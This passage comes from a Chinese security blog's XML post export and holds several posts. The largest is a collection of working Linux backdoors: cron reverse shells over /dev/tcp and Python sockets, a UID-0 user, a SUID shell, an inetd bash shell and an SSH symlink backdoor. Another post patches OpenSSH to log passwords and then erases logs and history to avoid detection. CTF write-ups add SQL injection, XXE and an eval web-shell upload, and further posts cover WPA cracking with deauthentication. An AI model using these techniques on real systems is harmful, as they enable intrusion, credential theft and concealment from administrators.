    <content type="text"><![CDATA[测试环境ubuntu16.04反弹shell目标：127.0.0.1:233 cron定时反弹shell 修改crontab文件 创建文件 /etc/… #!/bin/bash if netstat -ano|grep -v grep | grep &quot;127.0.0.1&quot;&gt;/dev/null then echo &quot;OK&quot;&gt;/dev/null else /sbin/iptables --policy INPUT ACCEPT /sbin/iptables --policy OUTPUT ACCEPT bash -i &gt;&amp; /dev/tcp/127.0.0.1/233 0&gt;&amp;1 fi 增加权限 chmod +sx /etc/... 然后在/etc/crontab中添加定时任务 */1 * * * * root /etc/... 最后重启一下 crond 的服务service cron reload 一句话Crontab后门bash版本(crontab -l;printf &quot;*/1 * * * * exec 9&lt;&gt; /dev/tcp/127.0.0.1/233;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab forwhoami%100c\n&quot;)|crontab -python版本(crontab -l;printf &quot;*/5 * * * * /usr/bin/python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,233));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;;\r\rno crontab forwhoami%100c\n&quot;)|crontab - Linux/Unix 添加 UID 为 0 的用户免交互设置密码 useradd seradd -u 0 -o -g root -G fdrag0n echo &quot;passwd&quot; | passwd --stdin fdrag0n 因为linux可能有密码策略所以推荐使用强密码替换passwd 爆破linux密码取出/etc/shadowhashcat爆破 ssh公钥免密将客户端生成的ssh公钥写到所控服务器的~/.ssh/authorized_keys中，然后客户端利用私钥完成认证即可登录。 客户端： $ ssh-keygen -t rsa $ ls id_rsa id_rsa.pub 把id_rsa.pub写入服务端的authorized_keys中，并修改好相应权限。 服务端： $ chmod 600 ~/.ssh/authorized_keys $ chmod 700 ~/.ssh 这种后门的特点是简单易用，但在实战中会被服务器的配置环境所限制，以及容易被发现(只要运维不傻)。 软连接后门ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=23333; 经典后门。直接对sshd建立软连接，之后用任意密码登录即可。 但这隐蔽性很弱，防护软件或者查看端口状态都可以找到。 重启会断开 SUID shell在root账号下执行 cp /bin/bash /.fdrag0n chmod 4755 /.fdrag0n 在普通用户下执行 /.fdrag0n -p 检查手段 find / -perm +4000 -ls inetd后门修改 /etc/inetd.conf 文件 原文件： #chargen dgram udp wait root internal #discard stream tcp nowait root internal #discard dgram udp wait root internal #daytime stream tcp nowait root internal 修改为: #discard stream tcp nowait root internal #discard dgram udp wait root internal daytime stream tcp nowait root /bin/bash bash -i 然后重启inetd ps -ef | grep inetdroot kill -HUP xxx 然后nc连接即可 rootkitopenssh后门参见https://fdrag0n.github.io/2018/05/15/SSH后门复现/ 内核级rookit暂未复现，复现后补上]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HCTF2018-Kzone]]></title>
    <url>%2F2018%2F10%2F19%2FHCTF2018-Kzone%2F</url>
    <content type="text"><![CDATA[Kzone随手一测发现备份文件泄露，www.zip，下载后代码审计。 看到有后台 查看login.php的源码：/www/admin 发现引入了配置文件../include/common.php 123456789101112131415161718192021222324&lt;?php error_reporting(0);header('Content-Type: text/html; charset=UTF-8');define('IN_CRONLITE', true);define('ROOT', dirname(__FILE__).'/');define('LOGIN_KEY', 'abchdbb679546');date_default_timezone_set("PRC");$date = date("Y-m-d H:i:s");session_start();include ROOT.'../config.php';if(!isset($port))$port='3306';include_once(ROOT."db.class.php");$DB=new DB($host,$user,$pwd,$dbname,$port);$password_hash='!@#%!s!';require_once "safe.php";require_once ROOT."function.php";require_once ROOT."member.php";require_once ROOT."os.php";require_once ROOT."kill.intercept.php";?&gt; 可以看到引入了safe.php 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpfunction waf($string)&#123; $blacklist = '/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i'; return preg_replace_callback($blacklist, function ($match) &#123; return '@' . $match[0] . '@'; &#125;, $string);&#125;function safe($string)&#123; if (is_array($string)) &#123; foreach ($string as $key =&gt; $val) &#123; $string[$key] = safe($val); &#125; &#125; else &#123; $string = waf($string); &#125; return $string;&#125;foreach ($_GET as $key =&gt; $value) &#123; if (is_string($value) &amp;&amp; !is_numeric($value)) &#123; $value = safe($value); &#125; $_GET[$key] = $value;&#125;foreach ($_POST as $key =&gt; $value) &#123; if (is_string($value) &amp;&amp; !is_numeric($value)) &#123; $value = safe($value); &#125; $_POST[$key] = $value;&#125;foreach ($_COOKIE as $key =&gt; $value) &#123; if (is_string($value) &amp;&amp; !is_numeric($value)) &#123; $value = safe($value); &#125; $_COOKIE[$key] = $value;&#125;unset($cplen, $key, $value);?&gt; 发现waf过滤了很多关键字 然后再看member.php 1234567891011121314151617181920212223242526272829303132&lt;?phpif (!defined('IN_CRONLITE')) exit();$islogin = 0;if (isset($_COOKIE["islogin"])) &#123; if ($_COOKIE["login_data"]) &#123; $login_data = json_decode($_COOKIE['login_data'], true); $admin_user = $login_data['admin_user']; $udata = $DB-&gt;get_row("SELECT * FROM fish_admin WHERE username='$admin_user' limit 1"); if ($udata['username'] == '') &#123; setcookie("islogin", "", time() - 604800); setcookie("login_data", "", time() - 604800); &#125; $admin_pass = sha1($udata['password'] . LOGIN_KEY); if ($admin_pass == $login_data['admin_pass']) &#123; $islogin = 1; &#125; else &#123; setcookie("islogin", "", time() - 604800); setcookie("login_data", "", time() - 604800); &#125; &#125;&#125;if (isset($_SESSION['islogin'])) &#123; if ($_SESSION["admin_user"]) &#123; $admin_user = base64_decode($_SESSION['admin_user']); $udata = $DB-&gt;get_row("SELECT * FROM fish_admin WHERE username='$admin_user' limit 1"); $admin_pass = sha1($udata['password'] . LOGIN_KEY); if ($admin_pass == $_SESSION["admin_pass"]) &#123; $islogin = 1; &#125; &#125;&#125;?&gt; 第6行json_decode()会把unicode自动解码，所以可以绕过waf 抓个包:，并且在cookie添加islogin=1和login_data=* 123456789101112131415POST /admin/login.php HTTP/1.1Host: 206.189.144.143:10000User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://206.189.144.143:10000/admin/login.phpContent-Type: application/x-www-form-urlencodedContent-Length: 25DNT: 1Connection: closeCookie: PHPSESSID=gu1u7fsbr0pub63546vot34163; islogin=1; login_data=*Upgrade-Insecure-Requests: 1user=1&amp;pass=2&amp;login=Login 然后编写tamper 1234567891011121314151617181920212223242526#!/usr/bin/env pythonfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies(): passdef tamper(payload, **kwargs): data = '''&#123;"admin_user":"%s"&#125;;''' payload = payload.lower() payload = payload.replace('u', '\u0075') payload = payload.replace('o', '\u006f') payload = payload.replace('i', '\u0069') payload = payload.replace('\'', '\u0027') payload = payload.replace('\"', '\u0022') payload = payload.replace(' ', '\u0020') payload = payload.replace('s', '\u0073') payload = payload.replace('#', '\u0023') payload = payload.replace('&gt;', '\u003e') payload = payload.replace('&lt;', '\u003c') payload = payload.replace('-', '\u002d') payload = payload.replace('=', '\u003d') payload = payload.replace('f1a9', 'F1a9') payload = payload.replace('f1', 'F1') return data % payload python .\sqlmap.py -r test.txt –tamper hctf -o –dbms mysql -D hctf_kouzone -T F1444g -C F1a9 –dump 得到flag：hctf{hctf_2018_kzone_Author_Li4n0}]]></content>
  </entry>
  <entry>
    <title><![CDATA[SCTF2018-nginx的秘密wp]]></title>
    <url>%2F2018%2F09%2F13%2FSCTF2018-nginx%E7%9A%84%E7%A7%98%E5%AF%86wp%2F</url>
    <content type="text"><![CDATA[NGINX的秘密NGINX配置问题导致任意文件读取 /static../etc/nginx/nginx.conf， 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113user www-data;worker_processes auto;pid /run/nginx.pid;events &#123; worker_connections 768; # multi_accept on;&#125;http &#123; ## # Basic Settings ## sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; # server_tokens off; # server_names_hash_bucket_size 64; # server_name_in_redirect off; include /etc/nginx/mime.types; default_type application/octet-stream; ## # SSL Settings ## ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE ssl_prefer_server_ciphers on; ## # Logging Settings ## #access_log /var/log/nginx/access.log; #error_log /var/log/nginx/error.log; ## # Gzip Settings ## gzip on; gzip_disable &quot;msie6&quot;; # gzip_vary on; # gzip_proxied any; # gzip_comp_level 6; # gzip_buffers 16 8k; # gzip_http_version 1.1; # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript; proxy_cache_path /tmp/mycache levels=1:2 keys_zone=my_cache:10m max_size=10g inactive=30s use_temp_path=off; limit_conn_zone $binary_remote_addr zone=conn:10m; limit_req_zone $binary_remote_addr zone=allips:10m rate=2r/s; server &#123; listen 4455 default_server; server_name localhost; location /static &#123; alias /home/; &#125; location ~* \.(css|js|gif|png)&#123; proxy_cache my_cache; proxy_cache_valid 200 30s; proxy_pass http://bugweb.app:8000; proxy_set_header Host $host:$server_port; proxy_ignore_headers Expires Cache-Control Set-Cookie; &#125; location / &#123; limit_conn conn 10; proxy_pass http://bugweb.app:8000; proxy_set_header Host $host:$server_port; &#125; &#125; ## # Virtual Host Configs ## include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*;&#125;#mail &#123;# # See sample authentication script at:# # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript# # # auth_http localhost/auth.php;# # pop3_capabilities &quot;TOP&quot; &quot;USER&quot;;# # imap_capabilities &quot;IMAP4rev1&quot; &quot;UIDPLUS&quot;;# # server &#123;# listen localhost:110;# protocol pop3;# proxy on;# &#125;# # server &#123;# listen localhost:143;# protocol imap;# proxy on;# &#125;#&#125; 可以看到开启了缓存，会把css|js|gif|png这四种文件类型缓存。 查看文档http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_cache_path 由proxy_cache_path得知缓存文件保存在/tmp/mycache，用于定义缓存文件名的proxy_cache_key未设置，则使用默认值 $scheme$proxy_host$request_uri，即文件名形式为md5($scheme$proxy_host$request_uri),由于proxy_cache_path设置了levels=1:2，因此缓存文件存在/tmp/mycache下的两级目录下，第一级目录名取MD5值的最后一个字符，第二级目录名取MD5值的倒数2、3个字符. 又根据提示得知路由规则很奇怪：访问/editxxxxx等同于访问/edit，同理访问/write_plan/a.js等同于访问/write_plan. 因而构造http://149.129.103.103:4455/write_plan/a.js/ 提交给管理员访问 机器人挂了还得手动😂 得到路径为这里是个坑 不是md5(http://149.129.103.103:4455/write_plan/a.js/) 而是md5(http://bugweb.app:8000/write_plan/a.js/) == 6fcfa7b1e6bad837b70dc98c9b82b43b 所以应该访问路径为http://149.129.103.103:4455/static../tmp/mycache/b/43/6fcfa7b1e6bad837b70dc98c9b82b43b 可以看到ftp用户名与密码syc10ver Eec5TN9fruOOTp2G. 然后利用xxe执行arp命令 version12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE person [&lt;!ENTITY remote SYSTEM&quot;file:///proc/net/arp&quot;&gt;]&gt;&lt;plans&gt; &lt;plan&gt; &lt;content&gt;&amp;remote;&lt;/content&gt; &lt;/plan&gt;&lt;/plans&gt; 得到3个ip a few seconds ago 172.19.0.1 0x1 0x2 02:42:ec:2a:71:fb * eth0 a few seconds ago a few seconds ago 172.19.0.4 0x1 0x2 02:42:ac:13:00:04 * eth0 a few seconds ago a few seconds ago 172.19.0.2 0x1 0x2 02:42:ac:13:00:02 * eth0 然后利用ftp读文件 12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE person [&lt;!ENTITY remote SYSTEM&quot;ftp://syc10ver:Eec5TN9fruOOTp2G@172.19.0.1/flag327a6c4304ad5938eaf0efb6cc3e53dc&quot;&gt;]&gt;&lt;plans&gt; &lt;plan&gt; &lt;content&gt;payload &amp;remote;&lt;/content&gt; &lt;/plan&gt;&lt;/plans&gt; sctf{Not_0n1y_xx3_but_als0_web_cache}]]></content>
  </entry>
  <entry>
    <title><![CDATA[PHP数组与c数组差异而引发的安全问题]]></title>
    <url>%2F2018%2F08%2F24%2FPHP%E6%95%B0%E7%BB%84%E4%B8%8Ec%E6%95%B0%E7%BB%84%E5%B7%AE%E5%BC%82%E8%80%8C%E5%BC%95%E5%8F%91%E7%9A%84%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[C语言数组C语言的数组都是由连续的内存位置组成。最低的地址对应第一个元素，最高的地址对应最后一个元素。 设有一个数组 1int array[2]; 无论是先给array[0]赋值,还是先给array[1]赋值，其在内存中的排序都是array[0]在前面array[1]在后面，所以无论是用指针指向array的最后一个单元还是直接引用array[1]的值,其所指的都是同一个值。 PHP的数组而PHP数组与C语言数组不一样，PHP 中的数组实际上是一个有序映射。映射是一种把 values 关联到 keys 的类型。此类型在很多方面做了优化，因此可以把它当成真正的数组，或列表（向量），散列表（是映射的一种实现），字典，集合，栈，队列以及更多可能性。由于数组元素的值也可以是另一个数组，树形结构和多维数组也是允许的。贴上一个简易的上传过滤源码 &lt;?php $file = $_GET[&apos;file&apos;]; if (!is_array($file)) { $file = explode(&apos;.&apos;, strtolower($file)); } print_r ($file); echo &apos;&lt;/br&gt;&apos;; $ext = end($file); if (!in_array($ext, [&apos;jpg&apos;, &apos;png&apos;, &apos;gif&apos;])) { print(&apos;This file is not allowed!&lt;/br&gt;&apos;); } else print(&apos;success!&lt;/br&gt;&apos;); var_dump($file); echo &apos;&lt;/br&gt;&apos;; $filename = reset($file) . &apos;.&apos; . $file[count($file) - 1]; echo &apos;filename:&apos;.$filename; echo &apos;&lt;/br&gt;&apos;; echo &apos;end($file):&apos;.end($file); ?&gt; 如图file[0]和file[1]都是由get传参，如果先给file[0]赋值png，再给file[1]赋值php的话，会被拦截。 file[0]=png&amp;file[1]=php 但是如果先给file[1]赋值php，再给file[0]赋值png的话，则可以成功绕过过滤规则上传。 file[1]=php&amp;file[0]=png 演示截图： 代码第六行和第十二行将其显示出来，由图右侧可见，如果先给file[0]赋值png，再给file[1]赋值php的话，数组是Array ( [0] =&gt; png [1] =&gt; php )，会被拦截。 而如果先给file[1]赋值php，再给file[0]赋值png的话，数组就是Array ( [1] =&gt; php [0] =&gt; png ) ,它所占内存区域中最后一个单元是file[0]=&gt;png，而不像C语言一样是file[1]，所以如果过滤代码一方面用end()来取出数组最后一个单元，而另外一处却用$file[count($file) - 1]来取出最后一个单元，就会存在有绕过的漏洞。 拿python来比较一下更好说明 C语言的数组更像Python 列表(List) 而PHP的数组像Python 字典(Dictionary) 涉及到的CTF： 网鼎杯第二场的上传题–wafUpload&lt;?php $sandbox = &apos;/var/www/html/upload/&apos; . md5(&quot;phpIsBest&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]); @mkdir($sandbox); @chdir($sandbox); if (!empty($_FILES[&apos;file&apos;])) { #mime check if (!in_array($_FILES[&apos;file&apos;][&apos;type&apos;], [&apos;image/jpeg&apos;, &apos;image/png&apos;, &apos;image/gif&apos;])) { die(&apos;This type is not allowed!&apos;); } #check filename $file = empty($_POST[&apos;filename&apos;]) ? $_FILES[&apos;file&apos;][&apos;name&apos;] : $_POST[&apos;filename&apos;]; if (!is_array($file)) { $file = explode(&apos;.&apos;, strtolower($file)); } $ext = end($file); if (!in_array($ext, [&apos;jpg&apos;, &apos;png&apos;, &apos;gif&apos;])) { die(&apos;This file is not allowed!&apos;); } $filename = reset($file) . &apos;.&apos; . $file[count($file) - 1]; if (move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $sandbox . &apos;/&apos; . $filename)) { echo &apos;Success!&apos;; echo &apos;filepath:&apos; . $sandbox . &apos;/&apos; . $filename; } else { echo &apos;Failed!&apos;; } } show_source(__file__); ?&gt; 第8-10行mime check部分 MIME 类型检测，使用图片马绕过。 第12-20行check filename部分 对文件后缀进行了检测，而后缀名则是取 $file 数组中最后一个元素。然后在生成文件的时候，文件名取$file 数组的最后一个元素做后缀，这明显存在绕过。我们只要控制$file数组中参数的即可绕过并 getshell ，请求数据包如下 POST / HTTP/1.1 Host: 4b590ee044fe8fb3a180712f8407e4136069037e.game.ichunqiu.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://4b590ee044fe8fb3a180712f8407e4136069037e.game.ichunqiu.com/ Content-Type: multipart/form-data; boundary=---------------------------9930139772306 Content-Length: 524 DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 -----------------------------9930139772123 Content-Disposition: form-data; name=&quot;filename[1]&quot; php -----------------------------9930139772123 Content-Disposition: form-data; name=&quot;filename[0]&quot; png -----------------------------9930139772123 Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;fdrag0n.jpg&quot; Content-Type: image/jpeg &lt;?php @eval($_POST[&apos;a&apos;]);?&gt; -----------------------------9930139772123 Content-Disposition: form-data; name=&quot;submit&quot; Submit -----------------------------9930139772123--]]></content>
  </entry>
  <entry>
    <title><![CDATA[利用autorun.inf预防自动运行病毒及个性化磁盘图标]]></title>
    <url>%2F2018%2F08%2F13%2F%E5%88%A9%E7%94%A8autorun-inf%E9%A2%84%E9%98%B2%E8%87%AA%E5%8A%A8%E8%BF%90%E8%A1%8C%E7%97%85%E6%AF%92%E5%8F%8A%E4%B8%AA%E6%80%A7%E5%8C%96%E7%A3%81%E7%9B%98%E5%9B%BE%E6%A0%87%2F</url>
    <content type="text"><![CDATA[AutoRun简介 AutoRun和AutoPlay是微软窗口系统的组件，其内容标示着系统在搜索到设备时可采取的行动。 AutoRun在Windows 95时首度露面，目的是帮助用户正确运行光盘上制作者想要运行的文件，另外AutoRun也能透过双击我的计算机内的设备图标启动AutoRun。但后来U盘病毒横行，微软发布更新关闭非光盘驱动器的AutoRun。 在Windows XP之后，微软让用户方便选择相关应用程序，制作出如图形化接口方式让用户选择如何处理设备中的文件。 AutoRun.inf文件 autrun.inf是我们电脑使用中比较常见的文件之一 ，其作用是允许在双击磁盘时自动运行指定的某个文件。但是近几年出现了用autorun.inf文件传播木马或病毒，它通过使用者的误操作让目标程序执行，达到侵入电脑的目的，带来了很大的负面影响。 AutoRun.inf的示例[autorun] open=setup.exe icon=setup.exe,0 label=My install CD 双击盘符时会运行setup.exe，而显示图标为setup.exe中第0个图标（即第1个图标），标签是My install CD。 AutoRun.inf的默认激活 插入设备时启动。 双击我的计算机设备时启动。 对我的计算机设备点击右键菜单中 “AutoRun” 项目时启动。 其他(如点击根目录文件夹)则不会启动。windows XP 以前 所有设备都会依照 Autorun.inf 启动。Windows 7 只有光盘会先运行 autorun.inf 利用autorun.inf给硬盘改图标及简易防病毒个性化磁盘—改图标在对应磁盘的根目录新建一个记事本，然后修改里面内容 [AUTORUN] ICON=drag0n.ico 然后将其保存为autorun.inf（注意ico的文件名字符不要超过6位） 再将你想用的图标转换成ico文件，推荐分辨率不要超过48x48，然后一同放进同目录下，然后改名为fdragn.ico。 简易防病毒此时文件是显示在当前目录下的，可以使用Windows下的attrib命令给文件增加属性 attrib指令的格式和常用参数为 ATTRIB [+R | -R] [+A | -A ] [+S | -S] [+H | -H] [[drive:] [path] filename] [/S [/D]] + 设置属性。 - 清除属性。 R 只读文件属性。 A 存档文件属性。 S 系统文件属性。 H 隐藏文件属性。 I 无内容索引文件属性。 [drive:][path][filename] 指定要处理的文件属性。 /S 处理当前文件夹及其子文件夹中的匹配文件。 /D 处理文件夹。 /L 处理符号链接和符号链接目标的属性。 所以使用 attrib +s +h +r autorun.inf 给autorun.inf添加系统、隐藏和只读属性，防止病毒修改autorun.inf文件 attrib +s +h drag0n.ico 给drag0n.ico文件添加系统和隐藏属性，美观。 如果还要修改的话，使用以下命令将其显示出来 attrib -s -h -r autorun.inf attrib -s -h fdrag0n.ico]]></content>
  </entry>
  <entry>
    <title><![CDATA[ctf常见隐写术总结]]></title>
    <url>%2F2018%2F07%2F30%2Fctf%E5%B8%B8%E8%A7%81%E9%9A%90%E5%86%99%E6%9C%AF%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[准备工具：winhex付费版（免费版功能有缺失），Stegsolve，MP3Steno等 ctf常见隐写术总结简单隐写： 右键查看图片属性，检查图片简介。 winhex打开，Ctrl+F查找有无flag明文。 文件类型：给出的文件不一定是它后缀名显示的文件，所以应该先用winhex打开它确认文件种类 JPEG (jpg)，文件头：FFD8FF PNG (png)，文件头：89504E47 GIF (gif)，文件头：47494638 Windows Bitmap (bmp)，文件头：424D ZIP Archive (zip)，文件头：504B0304 RAR Archive (rar)，文件头：52617221 复合文件：在kali里面使用binwalk工具即可查看如： root@kali:~# binwalk ‘/root/桌面/misc1.jpg’ DECIMAL HEXADECIMAL DESCRIPTION -——————————————————————————- 0 0x0 JPEG image data, EXIF standard 120xC TIFF image data, little-endian offset of first image directory: 8 4413190x6BBE7 Zip archive data, encrypted at least v2.0 to extract, compressed size: 90598, uncompressed size: 91905, name: hidden.jpg 5319570x81DF5 Zip archive data, encrypted at least v2.0 to extract, compressed size: 38092, uncompressed size: 38829, name: logo.png 5702690x8B39D End of Zip archive 可以看到有zip之类的文件在里面，所以直接利用binwalk提取， binwalk -e 图片高度一般这类的图片都会有明显的提示，包括但不限于箭头指向图片外，图片看上去不完整等。根据对应文件种类找到其高度位进行修改。 png文件， 多图层隐写最牛神器 zsteg毁天灭地 隐写术一大神器：stegsolve LSB隐写 如果上文测试找不到flag的话，可以使用stegsolve打开文件，然后点击左右翻动的按钮，可能会出现flag。 提取低位信息，一般都藏在0,1,2这些低位里面，在软件功能选项中查看Analyse→Data Extract，逐个调试。]]></content>
  </entry>
  <entry>
    <title><![CDATA[破解中兴电视盒子]]></title>
    <url>%2F2018%2F07%2F19%2F%E7%A0%B4%E8%A7%A3%E4%B8%AD%E5%85%B4%E7%94%B5%E8%A7%86%E7%9B%92%E5%AD%90%2F</url>
    <content type="text"><![CDATA[#记一次破解电信盒子 ##型号 ZTEB860AV1.1因为以前搞过家里的tcl电视，所以流程已经清楚 开启网络adb调试 为所欲为 ###开始 百度得知进入设置的密码为：6321进入设置后连接WiFi，然后到设置里找到开启adb调试，结果发现开启adb居然也需要密码，不得不说这群人为了控制用户也是下了血本，还好百度找到有写好的软件，上链接 工具相关软件 利用网络adb给电视盒子安装电视管理软件或者第三方桌面开始为所欲为。 在这里又发现一个问题，这边运营商将网线插口插在光猫的iptv上面，而那条路线是专线，无法正常使用，机顶盒开机会自动检测是否在这个网络下，不在就无法正常开机，所以每次开机的时候还得手动将设置中的网络设置改成有线连接，如果使用第三方应用则使用无线连接局域网即可，暂时没有想到更好地解决方案]]></content>
  </entry>
  <entry>
    <title><![CDATA[SSH后门复现]]></title>
    <url>%2F2018%2F05%2F15%2FSSH%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[#SSH后门复现 最开始先查看自己的ssh版本ssh -v 然后下载openssh和ssh后门12345678wget http://down1.chinaunix.net/distfiles/openssh-5.9p1.tar.gzwget http://openbsd.org.ar/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gztar zxvf openssh-5.9p1.tar.gztar zxvf 0x06-openssh-5.9p1.patch.tar.gzcd openssh-5.9p1.patch/cp sshbd5.9p1.diff ../openssh-5.9p1cd ../openssh-5.9p1patch &lt; sshbd5.9p1.diff //patch 后门 这时有可能出现报错信息-bash: patch: command not found代表没有安装patch命令包，解决方案： yum -y install patch 备份SSH原始配置文件12mv /etc/ssh/ssh_config /etc/ssh/ssh_config.oldmv /etc/ssh/sshd_config /etc/ssh/sshd_config.old 修改后门密码，和记录文件的位置vi includes.h 找到并修改123456#define ILOG &quot;/tmp/ilog&quot;//记录登录到本机的用户名和密码#define OLOG &quot;/tmp/olog&quot;//记录本机登录到远程的用户名和密码#define SECRETPW &quot;fdrag0n&quot;//你后门的密码 修改SSH版本信息，改为第一步看到的vi version.h 环境配置如果没有以上环境有可能会报错 123yum install -y gccyum install -y openssl openssl-devel pam-devel./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5 如果出现报错信息中带有：configure: error: zlib.h missing – please install first or check config.log之类的信息安装zib yum install -y zlib 安装并重启SSH12make &amp;&amp; make installservice sshd restart 简单处理记录还原新配置文件为旧配置文件时间12touch -r/etc/ssh/ssh_config.old /etc/ssh/ssh_configtouch -r/etc/ssh/sshd_config.old /etc/ssh/sshd_config 将ssh_config和sshd_config修改时间跟ssh_config.old和sshd_config.old一致，减少被发现的概率。 清除apache日志12345export HISTFILE=/dev/null export HISTSIZE=0 cd /etc/httpd/logs/ sed -i ‘/192.168.52.175/d’ access_log* echo &gt;/root/.bash_history //清空操作日志 清除用户目录下的.bash_history文件vi .bash_history 然后全部删除保存。]]></content>
  </entry>
  <entry>
    <title><![CDATA[sql手注步骤（非盲注）]]></title>
    <url>%2F2018%2F05%2F05%2Fsql%E6%89%8B%E6%B3%A8%E6%AD%A5%E9%AA%A4%2F</url>
    <content type="text"><![CDATA[手注步骤 目录1.判断是否存在注入，注入是字符型还是数字型 2.猜解SQL查询语句中的字段数 3.确定显示的字段顺序 4.获取当前数据库 5.获取数据库中的表 6.获取表中的字段名 7.下载数据 1.判断是否存在注入，注入是字符型还是数字型判断注入类型：数字型，字符型 2.猜解SQL查询语句中的字段数判断字段数： 1′ or 1=1 order by 1,2,3,4,5 # 数字累加，直到不出结果或者报错。 注释常常使用--+或者#或者%23 或者用： -1′ union select 1,2 # 两个sql语句进行联合操作时，当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来 顺路进行下一步 3.确定显示的字段顺序-1′ union select 1,2 # 4.获取当前数据库-1′ union select 1,database() # 5.获取数据库中的表-1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 从information_schema中查找表名 进行联合查询时要将查询用的语句放在最后一项 6.获取表中的字段名-1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ # 爆users表内的表名 7.下载数据-1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users # 从users里面取出所有用户的user_id,first_name,last_name,password的数据]]></content>
      <categories>
        <category>sql</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用kali破解wpa/wpa2加密的WIFI（爆破美学）]]></title>
    <url>%2F2018%2F05%2F01%2F%E5%88%A9%E7%94%A8kali%E7%A0%B4%E8%A7%A3wpa-wpa2%E5%8A%A0%E5%AF%86%E7%9A%84WIFI%EF%BC%88%E7%88%86%E7%A0%B4%E7%BE%8E%E5%AD%A6%EF%BC%89%2F</url>
    <content type="text"><![CDATA[利用kali破解wpa/wpa2加密的WIFI（爆破美学）硬件准备阶段：因为用vm安装的kali不支持笔记本内置的无限网卡所以需要购买kali支持的网卡，博主买的是RT3070L芯片组的网卡，某宝上面无壳的只要20元，加壳才25元。 在kali中必须识别出网卡，使用ifconfig查看网卡信息，wlan0为无线网卡。 攻击准备阶段：开启网卡监听模式：airmon-ng start wlan0 如果成功的话，网卡名称会变成wlan0mon 扫描热点：airodump-ng wlan0mon 可以看到如图信息[ 抓握手包：c代表信道，bssid为mac地址，w参数指的是抓到的包放的目录以及包的名字。 airodump-ng wlan0mon -c 4 --bssid XX:XX:XX:XX -w /root -c 选择信道，对应上图CH --bssid 需要破解的wifi的mac地址 -w cap文件名及路径 wlan0mon 启用监听模式的网卡名 当有人连接时就能抓到握手包。 如果对面都在使用wifi，没人连接怎么办？通过以下命令断开设备与WiFi的连接 aireplay-ng -0 20 -a A8:6B:7C:19:9F:D0 -c 4C:49:E3:D8:FD:7F wlan0mon -0 death（强制下线模式），20为执行次数 -c 被断网的客户机MAC -a WIFI热点的mac 抓包成功后白圈出现信息。 爆破：kali：利用aircrack-ng命令 aircrack-ng -w 字典 握手包 cpu跑这个破解速度有些慢。 windows：神器1：EWSA，然而7.x版本虽然支持gpu加速，然而没有破解版软件，只能查看密码前两位，收费299$(贵死人) 神器2：oclHashcat，使用方法有些复杂，是一个win下面的使用命令行的工具，破解速度十分可观。有国人开发了中文版的UI，减少了使用成本，链接：HashcatGUI_cn – HashcatGUI 中文版]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件包含漏洞常用命令]]></title>
    <url>%2F2018%2F04%2F09%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
